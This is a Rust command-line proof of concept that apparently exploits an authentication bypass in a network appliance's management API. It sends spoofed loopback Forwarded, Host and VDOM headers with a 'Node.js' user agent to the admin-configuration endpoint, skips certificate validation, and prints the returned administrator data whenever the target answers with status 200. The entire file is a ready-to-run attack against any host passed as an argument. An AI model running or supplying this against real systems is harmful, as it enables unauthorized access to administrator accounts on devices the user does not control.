use std::error::Error;
use std::env;
use reqwest::header::{HeaderMap, HeaderValue, USER_AGENT, HOST, ACCEPT_ENCODING, FORWARDED};

fn construct_headers() -> HeaderMap {
    let mut headers = HeaderMap::new();
    headers.insert(USER_AGENT, HeaderValue::from_static("Node.js"));
    headers.insert(ACCEPT_ENCODING, HeaderValue::from_static("accept-encoding"));
    headers.insert(HOST, HeaderValue::from_static("127.0.0.1:9980"));
    headers.insert(FORWARDED, HeaderValue::from_static("by='[127.0.0.1]:80';for='[127.0.0.1]:49490';proto=http;host="));
    headers.insert("X-FORWARDED-VDOM", HeaderValue::from_static("root"));
    headers
}

fn main() -> Result<(), Box<dyn Error>> {
    openssl_probe::init_ssl_cert_env_vars();
    let args: Vec<String> = env::args().collect();
    let query = &args[1];
    let str = format!("{}/api/v2/cmdb/system/admin", query);
    let client = reqwest::blocking::Client::builder()
            .danger_accept_invalid_certs(true)
            .build()?;
    //let client = reqwest::blocking::Client::new();
    //let res = client.get(str)
    let res = client
            .get(str)
            .headers(construct_headers())
            .send()?;

    if res.status() == 200 {
        println!("[+] Vulnerable");
        println!("{:#?}", res.text());
        //Ok(())
    }
    else {
        println!("[-] Not Vulnerable");
        println!("Bad Status: {:?}", res.status())
    }
    Ok(())
}
